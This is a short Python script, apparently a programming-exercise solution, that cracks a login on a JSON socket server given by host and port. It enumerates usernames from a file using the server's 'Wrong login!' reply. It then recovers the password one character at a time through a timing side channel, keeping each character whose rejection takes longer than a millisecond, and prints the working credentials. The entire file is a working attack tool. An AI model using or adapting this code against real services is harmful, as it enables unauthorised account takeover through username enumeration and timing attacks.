import sys
import socket
import itertools
import json
import datetime
from time import sleep

def iter_all_strings():
    for size in itertools.count(1):
        for s in itertools.product(abc, repeat=size):
            yield "".join(s)

def split(word):
    return [char for char in word]

abc = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V'
        ,'W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r',
            's','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9']

str = ""
passwords = open("passwords.txt", "r+")
logins = open("logins.txt", "r+")
words = []
logs = []
login = {}
username = ""
word = ""
for line in passwords:
    password = line.split()
    words.append(password[0])
    for k in range(len(password[0])+1):
        for s in itertools.combinations(password[0], k):
            str = split(password[0])
            for n in range(len(str)):
                if str[n] in s:
                    str[n] = str[n].upper()
                    words.append("".join(str))
words = list(dict.fromkeys(words))

for line in logins:
    login = line.split()
    logs.append(login[0])

args = sys.argv
host = args[1]
port = int(args[2])
address = (host, port)

client_socket = socket.socket()
client_socket.connect(address)

for log in logs:
    login = {"login": log, "password":''}
    json_login = json.dumps(login)
    client_socket.send(json_login.encode())
    json_response = client_socket.recv(1024).decode()
    response = json.loads(json_response)
    if (response["result"]  == "Wrong login!") :
        pass
    else:
        username = log
        i = 0
        temp = ""
        counter = 0
        while counter < 1:
            for n in abc:
                temp = word + n
                if i == 0:
                    login = {"login": username, "password": n}
                else:
                    login = {"login": username, "password": temp}
                start = datetime.datetime.now()
                json_login = json.dumps(login)
                client_socket.send(json_login.encode())
                json_response = client_socket.recv(1024).decode()
                finish = datetime.datetime.now()
                difference = finish - start
                response = json.loads(json_response)
                if (response["result"] == "Wrong password!"):
                    if difference > datetime.timedelta(seconds =0.001):
                        word += n
                elif (response["result"] == "Connection success!"):
                    print(json_login)
                    counter = 1
                    break
                i += 1

        break




client_socket.close()